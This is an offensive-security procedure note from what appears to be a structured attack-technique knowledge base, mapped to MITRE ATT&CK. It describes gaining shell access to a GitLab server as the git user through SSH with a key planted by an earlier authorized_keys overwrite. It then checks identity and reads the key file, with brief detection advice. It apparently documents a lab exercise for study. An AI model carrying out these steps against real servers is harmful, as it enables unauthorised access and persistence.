---
tags:
  - ssh-access
  - rce
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/git]]'
  - '[[tools/ssh]]'
  - '[[tools/cat]]'
  - '[[tools/GitLab-Wiki]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-gitlab-search-wiki-blobs]]'
  - '[[commands/cat-file-contents]]'
  - '[[commands/ssh-gitlab-access]]'
  - '[[commands/id-user-check]]'
  - '[[commands/cat-authorized-keys]]'
  - '[[commands/curl-gitlab-search-blobs]]'
platforms:
  - Linux
techniques:
  - '[[tools/ssh]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6ec8905d-2d0a-4311-9806-f054163fbd76
created_at: '2025-12-11T06:10:29.600Z'
updated_at: '2025-12-11T06:10:29.600Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1021.004]]'
---
# Establish SSH Access

## Summary

This procedure establishes SSH connection to the GitLab server using the injected key, achieving RCE as the git user.

## Description

After overwriting authorized_keys, use the private key to SSH in, confirm user with id, and verify the key file.

## Requirements

1. Private key from generated pair
2. SSH service exposed on GitLab server
3. Successful overwrite of authorized_keys

## Defense

Defensive measures and detection strategies:

- Use key-based authentication monitoring
- Detect anomalous SSH logins

## Objectives

1. Gain remote shell
2. Confirm git user access
3. Verify exploitation success

## Instructions

### Step 1: SSH Connection

**Context**: Connect using private key.

**Command** ([[commands/ssh-gitlab-access]]):
```bash
ssh git@gitlab-vm.local -i gitlab
```

> Establishes shell access.

### Step 2: Check User ID

**Context**: Confirm user privileges.

**Command** ([[commands/id-user-check]]):
```bash
id
```

> Shows uid=998(git).

### Step 3: Verify Authorized Keys

**Context**: Read the file to confirm key insertion.

**Command** ([[commands/cat-authorized-keys]]):
```bash
cat /var/opt/gitlab/.ssh/authorized_keys
```

> Displays commit with public key.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[tools/ssh]]

### Sub-Techniques



## Commands Used

- [[commands/ssh-gitlab-access]]
- [[commands/id-user-check]]
- [[commands/cat-authorized-keys]]

## Tools Used

- [[tools/ssh]]

## Tags

- [[tools/ssh]]
- [[rce]]
